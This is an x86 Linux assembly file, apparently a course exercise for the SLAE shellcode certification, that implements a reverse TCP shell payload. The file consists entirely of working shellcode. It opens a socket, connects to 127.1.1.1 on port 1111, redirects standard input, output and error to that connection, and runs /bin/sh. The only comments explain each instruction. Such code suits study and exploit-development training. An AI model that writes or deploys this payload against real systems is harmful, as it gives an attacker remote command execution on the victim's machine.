; Filename: reversetcp.asm
; Author:   Reuben Sammut
; SLAE ID:  510

global _start

section .text

_start:
	; create socket
	xor eax, eax
	cdq		 ; extend sign of eax to edx (edx = 0)
	mov ebx, eax
	mov al, 0x66 	 ; socketcall
	mov bl, 0x1 	 ; cmd = socket (1)

	push edx 	 ; protocol = 0
	push 0x1 	 ; type = SOCK_STREAM (1)
	push 0x2 	 ; domain = AF_INET (2)
	lea ecx, [esp]
	int 0x80
	mov edi, eax

	; connect 
	push edx	 ; sin_zero[4-7]
	push edx	 ; sin_zero[0-3]
	push 0x0101017F	 ; sin_addr(127.1.1.1)
	push word 0x5704 ; sin_port (1111 = 0x0457)
	push word 0x2	 ; sin_family = AF_INET (2)
	mov ebp, esp
	push 0x10	 ; socklen
	push ebp	 ; addr pointer
	push edi	 ; sockfd
	
	mov al, 0x66	 ; socketcall
	mov bl, 0x3	 ; cmd = connect (3)
	lea ecx, [esp]
	int 0x80

	; dup2
	mov ecx, edx
	mov cl, 0x2 	 ; start from fd = 2 (stderr) and go down to 0

dup2:	mov al, 0x3F	 ; dup2
	mov ebx, edi	 ; clientfd
	int 0x80
	dec ecx
	jns dup2

	; execve
	push edx	 ; 
	push 0x68732f6e	 ; 
	push 0x69622f2f  ; "//bin/sh\0"
	mov ebp, esp     ; loc of "//bin/sh\0"
	push edx	 ; NULL
	lea edx, [esp]   ; evp = { NULL }
	push ebp         ; push loc of "//bin/sh\0"
	lea ecx, [esp]	 ; argp = { "//bin/sh\0", NULL }
	mov ebx, ebp     ; //bin/sh\0
	mov al, 0x0b     ; execve
	int 0x80

